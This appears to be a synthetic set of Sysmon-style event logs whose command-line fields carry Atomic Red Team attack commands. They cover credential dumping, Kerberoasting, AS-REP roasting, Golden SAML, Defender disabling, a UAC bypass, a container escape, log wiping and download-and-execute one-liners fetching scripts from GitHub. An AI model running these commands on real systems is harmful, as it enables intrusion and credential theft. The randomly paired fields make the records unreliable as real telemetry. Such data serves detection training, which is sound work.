    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-95.robinson.info",
        "User": "cjohnson",
        "ProcessID": 3074,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"\\\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\\\"\\n\",",
        "LogonID": 539602,
        "LogonGuid": "752980ac-f7c4-4336-bd49-982d1ff8d384",
        "SourceProcessID": 5348,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\idea..exe",
        "DestinationProcessID": 9050,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\every..dll",
        "UtcTime": "2024-05-17T01:36:51.725803Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-27.duarte-nelson.info",
        "User": "hardyjohn",
        "ProcessID": 7121,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\\n[ \\\"$(uname)\\\" = 'FreeBSD' ] && testcat /etc/master.passwd\\ntestcat /etc/passwd\\ntestcat /etc/shadow\\n\",",
        "LogonID": 432685,
        "LogonGuid": "b938bd94-e175-4264-a9a4-7c673fe47d0a",
        "SourceProcessID": 6603,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\believe..exe",
        "DestinationProcessID": 7441,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\without..exe",
        "UtcTime": "2024-05-17T01:36:51.725803Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-70.becker.biz",
        "User": "baileysydney",
        "ProcessID": 7230,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"findstr /S cpassword %logonserver%\\\\sysvol\\\\*.xml\\n\",",
        "LogonID": 504894,
        "LogonGuid": "5aa35316-3995-4384-b3ed-08eba32e10a5",
        "SourceProcessID": 4793,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\despite..exe",
        "DestinationProcessID": 2023,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\dream..exe",
        "UtcTime": "2024-05-17T01:36:51.725803Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-50.sheppard-lewis.com",
        "User": "brittanycruz",
        "ProcessID": 7921,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\EtwpCreateEtwThread.exe -debug\\n\",",
        "LogonID": 959104,
        "LogonGuid": "9a0afa73-c761-4eed-aee4-95f3c97dd4ab",
        "SourceProcessID": 2420,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\hear..exe",
        "DestinationProcessID": 8429,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\argue..exe",
        "UtcTime": "2024-05-17T01:36:51.725803Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-05.boyd.com",
        "User": "bakeranthony",
        "ProcessID": 1572,
        "ProcessName": "nc.exe",
        "CommandLine": "\"fsutil usn deletejournal /D C:\\n\",",
        "LogonID": 557101,
        "LogonGuid": "b97154b2-8f8a-46bc-a42f-171ad5c64d77",
        "SourceProcessID": 4976,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\both..dll",
        "DestinationProcessID": 3466,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\million..dll",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-40.jones.com",
        "User": "rogerthompson",
        "ProcessID": 6384,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"pktmon.exe start --etw  -f %TEMP%\\\\t1040.etl\\nTIMEOUT /T 5 >nul 2>&1\\npktmon.exe stop\\n\",",
        "LogonID": 873802,
        "LogonGuid": "f75c96fa-52a4-4032-9c8b-01b836e67fd5",
        "SourceProcessID": 1390,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\attack..dll",
        "DestinationProcessID": 8073,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\him..dll",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-58.davis.info",
        "User": "lauren05",
        "ProcessID": 4154,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\\n\",",
        "LogonID": 536648,
        "LogonGuid": "913eec93-6072-400b-825c-bd32a4d6c41a",
        "SourceProcessID": 4568,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\between..dll",
        "DestinationProcessID": 5735,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\themselves..dll",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-09.hernandez.org",
        "User": "aaronmyers",
        "ProcessID": 5662,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\\n\",",
        "LogonID": 586575,
        "LogonGuid": "cd2c4a11-127f-4ecb-82da-21146664c032",
        "SourceProcessID": 5394,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\into..exe",
        "DestinationProcessID": 3391,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\network..dll",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-48.horton.net",
        "User": "ortizapril",
        "ProcessID": 6920,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\\n\",",
        "LogonID": 164030,
        "LogonGuid": "d7838522-2f1f-4944-84e9-f61b8b55e868",
        "SourceProcessID": 4181,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\mind..exe",
        "DestinationProcessID": 5334,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\special..exe",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-24.evans.biz",
        "User": "fburns",
        "ProcessID": 2679,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"cmd.exe /c \\\"#{local_folder}\\\\#{local_executable}\\\" asreproast /outfile:\\\"#{local_folder}\\\\#{out_file}\\\"\\n\",",
        "LogonID": 571571,
        "LogonGuid": "fbb0b402-260c-4db0-ad27-546b67c527ba",
        "SourceProcessID": 1215,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\worker..exe",
        "DestinationProcessID": 1405,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\economic..exe",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-10.sanchez-harper.com",
        "User": "steven40",
        "ProcessID": 5008,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}\",",
        "LogonID": 118787,
        "LogonGuid": "81e7f6c4-1a3e-49c7-84e5-ed7a20022f18",
        "SourceProcessID": 7624,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\station..exe",
        "DestinationProcessID": 5041,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\listen..dll",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-25.bennett-decker.biz",
        "User": "jlopez",
        "ProcessID": 8167,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 563484,
        "LogonGuid": "85fd157f-c57c-4599-8345-d35f9403cb99",
        "SourceProcessID": 7248,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\your..dll",
        "DestinationProcessID": 4559,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\imagine..exe",
        "UtcTime": "2024-05-17T01:36:51.726797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-78.scott-hood.com",
        "User": "fordrebecca",
        "ProcessID": 8992,
        "ProcessName": "nc.exe",
        "CommandLine": "\"net accounts\\n\",",
        "LogonID": 572706,
        "LogonGuid": "538daae4-b3f9-4c28-85bd-7495103da34f",
        "SourceProcessID": 6729,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\maybe..exe",
        "DestinationProcessID": 6352,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\happen..dll",
        "UtcTime": "2024-05-17T01:36:51.728302Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-05.johnson.com",
        "User": "jennifer67",
        "ProcessID": 5015,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"net.exe stop #{service_name}\\n\",",
        "LogonID": 517389,
        "LogonGuid": "edb01a09-9dcb-47ef-9b94-1fb917da60fb",
        "SourceProcessID": 9084,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\ground..exe",
        "DestinationProcessID": 2123,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\while..dll",
        "UtcTime": "2024-05-17T01:36:51.728302Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-38.hull.com",
        "User": "ryancalhoun",
        "ProcessID": 1367,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo launchctl unload #{falcond_plist}\\nsudo launchctl unload #{userdaemon_plist}\\n\",",
        "LogonID": 818300,
        "LogonGuid": "d8aa633c-1e7a-4f9e-8012-9cf3af6e146d",
        "SourceProcessID": 7749,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\since..exe",
        "DestinationProcessID": 2914,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\page..exe",
        "UtcTime": "2024-05-17T01:36:51.728302Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-84.miranda.com",
        "User": "greenbreanna",
        "ProcessID": 5135,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe /out:\\\"#{output_file}\\\" /target:exe \\\"#{source_file}\\\"\\n%tmp%/T1106.exe\\n\",",
        "LogonID": 424389,
        "LogonGuid": "d8a1922e-411a-418e-8a18-a555725acf05",
        "SourceProcessID": 1336,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\treatment..exe",
        "DestinationProcessID": 3901,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\realize..dll",
        "UtcTime": "2024-05-17T01:36:51.728302Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-90.baker.biz",
        "User": "matthew95",
        "ProcessID": 5176,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\\nfind . -type f -iname *.pdf >> #{output_file}\\ncat #{output_file}\\nfind . -type f -name \\\".*\\\"\\n\",",
        "LogonID": 839732,
        "LogonGuid": "5434a7c5-cbf2-4858-9177-85ca6cce672a",
        "SourceProcessID": 1349,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\her..exe",
        "DestinationProcessID": 6003,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\grow..dll",
        "UtcTime": "2024-05-17T01:36:51.729308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-83.elliott.info",
        "User": "elizabeth21",
        "ProcessID": 5709,
        "ProcessName": "nc.exe",
        "CommandLine": "\"g++ #{input_file} && ./a.out\\nclang++ #{input_file} && ./a.out\\n\",",
        "LogonID": 255195,
        "LogonGuid": "d11629b4-e513-4cbe-8c3c-6584111cd459",
        "SourceProcessID": 1715,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\letter..exe",
        "DestinationProcessID": 8058,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\like..dll",
        "UtcTime": "2024-05-17T01:36:51.729308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-22.blake.com",
        "User": "owenscrystal",
        "ProcessID": 6824,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg.exe import \\\"#{registry_file}\\\"\\n\",",
        "LogonID": 258332,
        "LogonGuid": "bb0e31c2-6987-4151-952d-85c7f7c40318",
        "SourceProcessID": 4956,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\six..exe",
        "DestinationProcessID": 6249,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\little..dll",
        "UtcTime": "2024-05-17T01:36:51.729308Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-23.hubbard.com",
        "User": "charlesmathis",
        "ProcessID": 1235,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Import-Module AADInternals -Force\\n$saml = New-AADIntSAMLToken -ImmutableID \\\"#{immutable_id}\\\" -PfxFileName \\\"#{certificate_path}\\\" -Issuer \\\"#{issuer_uri}\\\"\\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\\nif ($conn) { Write-Host \\\"`nSuccessfully connected as $($conn.User)\\\" } else { Write-Host \\\"`nThe connection failed\\\" }\\nWrite-Host \\\"End of Golden SAML\\\"\\n\",",
        "LogonID": 208685,
        "LogonGuid": "125e398e-b1b2-4ffc-9951-0cfaf35ef245",
        "SourceProcessID": 5437,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\never..dll",
        "DestinationProcessID": 5721,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\different..dll",
        "UtcTime": "2024-05-17T01:36:51.729308Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-65.solis.com",
        "User": "munozcrystal",
        "ProcessID": 9342,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')\",",
        "LogonID": 617330,
        "LogonGuid": "d6f774a0-48eb-4f79-ae44-fb35431a615e",
        "SourceProcessID": 2603,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\expert..exe",
        "DestinationProcessID": 2260,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\continue..dll",
        "UtcTime": "2024-05-17T01:36:51.729308Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-14.alexander.com",
        "User": "perezgrace",
        "ProcessID": 9693,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053.005-macrocode.txt\\\" -officeProduct \\\"#{ms_product}\\\" -sub \\\"Scheduler\\\"\\n\",",
        "LogonID": 682134,
        "LogonGuid": "a7671fe9-e6d0-48fb-a7b7-0ba36a32b9b0",
        "SourceProcessID": 1514,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\apply..dll",
        "DestinationProcessID": 5338,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\camera..dll",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-46.parks.net",
        "User": "sjones",
        "ProcessID": 6457,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Command Processor\\\" -Name \\\"AutoRun\\\" -Value \\\"#{command}\\\" -PropertyType \\\"String\\\"\",",
        "LogonID": 787472,
        "LogonGuid": "58c0ed4e-9341-4afb-b618-f06a2926104f",
        "SourceProcessID": 3451,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\she..dll",
        "DestinationProcessID": 2166,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\son..exe",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-02.miller-stewart.org",
        "User": "kevin00",
        "ProcessID": 8293,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Disable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-Gui\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-Features\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-ApplicationGuard\\\" -NoRestart -ErrorAction Ignore\",",
        "LogonID": 689198,
        "LogonGuid": "c6766b6e-2ae5-4821-a71e-c188ecbb01c4",
        "SourceProcessID": 5573,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\hour..dll",
        "DestinationProcessID": 7402,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\reveal..dll",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-72.mendoza-dillon.com",
        "User": "radams",
        "ProcessID": 2338,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\\nInvoke-Kerberoast | fl\\n\",",
        "LogonID": 660623,
        "LogonGuid": "ee5079ce-044f-43a8-987e-e747ca4385db",
        "SourceProcessID": 7865,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\degree..dll",
        "DestinationProcessID": 6261,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\three..dll",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-86.hamilton.com",
        "User": "kruegersara",
        "ProcessID": 8795,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"tasklist\\n\",",
        "LogonID": 681208,
        "LogonGuid": "1ef3f27e-4347-4659-91db-8eaa99e4d742",
        "SourceProcessID": 2759,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\keep..exe",
        "DestinationProcessID": 1998,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\product..dll",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-91.thompson.com",
        "User": "amanda73",
        "ProcessID": 5578,
        "ProcessName": "malware.exe",
        "CommandLine": "\"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\\\"spec\\\":{\\\"hostPID\\\": true, \\\"containers\\\":[{\\\"name\\\":\\\"1\\\",\\\"image\\\":\\\"alpine\\\",\\\"command\\\":[\\\"nsenter\\\",\\\"--mount=/proc/1/ns/mnt\\\",\\\"--\\\",\\\"/bin/bash\\\"],\\\"stdin\\\": true,\\\"tty\\\":true,\\\"securityContext\\\":{\\\"privileged\\\":true}}]}}'\\n\",",
        "LogonID": 801050,
        "LogonGuid": "18a6842b-c694-43d4-9ba5-81d25691e944",
        "SourceProcessID": 1921,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\too..dll",
        "DestinationProcessID": 3226,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\center..exe",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-49.mitchell.biz",
        "User": "bill09",
        "ProcessID": 3182,
        "ProcessName": "malware.exe",
        "CommandLine": "\"#{mimikatz_path} \\\"privilege::debug\\\" \\\"sid::patch\\\" \\\"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\\\" \\\"exit\\\"\\n\",",
        "LogonID": 209757,
        "LogonGuid": "1c7600d7-b5ac-4ec8-abcb-af8fd10506a7",
        "SourceProcessID": 7985,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\factor..dll",
        "DestinationProcessID": 6184,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\on..exe",
        "UtcTime": "2024-05-17T01:36:51.730309Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-64.miller.org",
        "User": "zdiaz",
        "ProcessID": 7693,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\\\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\\\"))\\n$item = $o.Item()\\n$item.Document.Application.ShellExecute(\\\"cmd.exe\\\",\\\"/c calc.exe\\\",\\\"C:\\\\windows\\\\system32\\\",$null,0)\\n\",",
        "LogonID": 737711,
        "LogonGuid": "1d45f8fb-96c8-4ff0-b7ec-6a9ca616c3bf",
        "SourceProcessID": 9122,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\music..dll",
        "DestinationProcessID": 1979,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\small..exe",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-91.cook.com",
        "User": "apalmer",
        "ProcessID": 5996,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\\n\",",
        "LogonID": 837420,
        "LogonGuid": "93137a71-77a7-4009-9ed1-3175d6b7c62b",
        "SourceProcessID": 5008,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\nation..dll",
        "DestinationProcessID": 6190,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\get..dll",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-44.bailey.com",
        "User": "michaeldouglas",
        "ProcessID": 9469,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"copy #{exe_to_launch} not_an_scr.scr\\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\\n\",",
        "LogonID": 617057,
        "LogonGuid": "86be58b0-e795-438b-ba91-48093d820d84",
        "SourceProcessID": 8002,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\short..dll",
        "DestinationProcessID": 3393,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\carry..exe",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-35.jones.com",
        "User": "laura49",
        "ProcessID": 7209,
        "ProcessName": "malware.exe",
        "CommandLine": "\"hostname\\n\",",
        "LogonID": 925724,
        "LogonGuid": "04ddf8fa-7d32-4c0b-b8d4-de5e2cdf4d00",
        "SourceProcessID": 7686,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\meeting..dll",
        "DestinationProcessID": 8768,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\after..exe",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-35.bennett.com",
        "User": "sherri99",
        "ProcessID": 9744,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"for %i in (C$ IPC$ ADMIN$) do net share %i /delete\",",
        "LogonID": 952380,
        "LogonGuid": "06e466fc-e813-46f9-8302-be4ac8a3133d",
        "SourceProcessID": 7532,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\town..exe",
        "DestinationProcessID": 2557,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\cold..exe",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-80.johnson.com",
        "User": "jeffreycox",
        "ProcessID": 5558,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"powershell.exe -exec bypass -noprofile \\\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\\"\\n\",",
        "LogonID": 606942,
        "LogonGuid": "ab22c6c9-4ebd-4312-a32f-7b30e4d198c7",
        "SourceProcessID": 5041,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\cost..exe",
        "DestinationProcessID": 6613,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\reality..exe",
        "UtcTime": "2024-05-17T01:36:51.731308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-77.petty.com",
        "User": "ann38",
        "ProcessID": 2728,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sudo echo '' > #{system_log_path}\\n\",",
        "LogonID": 200982,
        "LogonGuid": "9be60eba-e5c6-4be1-b887-12afc34c14a4",
        "SourceProcessID": 1776,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\performance..exe",
        "DestinationProcessID": 6496,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\country..exe",
        "UtcTime": "2024-05-17T01:36:51.732308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-62.orozco.com",
        "User": "cmorgan",
        "ProcessID": 8919,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"New-Item \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Force\\nNew-ItemProperty \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Name \\\"DelegateExecute\\\" -Value \\\"\\\" -Force\\nSet-ItemProperty \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Name \\\"(default)\\\" -Value \\\"#{executable_binary}\\\" -Force\\nStart-Process \\\"C:\\\\Windows\\\\System32\\\\fodhelper.exe\\\"\\n\",",
        "LogonID": 997954,
        "LogonGuid": "081b5c83-29b8-46bd-b692-931ff32191d3",
        "SourceProcessID": 4296,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\way..dll",
        "DestinationProcessID": 1613,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\night..exe",
        "UtcTime": "2024-05-17T01:36:51.732308Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-84.ferguson.com",
        "User": "elizabeth38",
        "ProcessID": 2404,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\temp_T1027js.zip\\\\T1027js.js\\\"\\n\",",
        "LogonID": 258037,
        "LogonGuid": "df82e11f-017e-4301-8757-375d0dc34cea",
        "SourceProcessID": 4687,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\join..dll",
        "DestinationProcessID": 7165,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\all..dll",
        "UtcTime": "2024-05-17T01:36:51.732308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-25.robinson.org",
        "User": "katherineparks",
        "ProcessID": 6119,
        "ProcessName": "malware.exe",
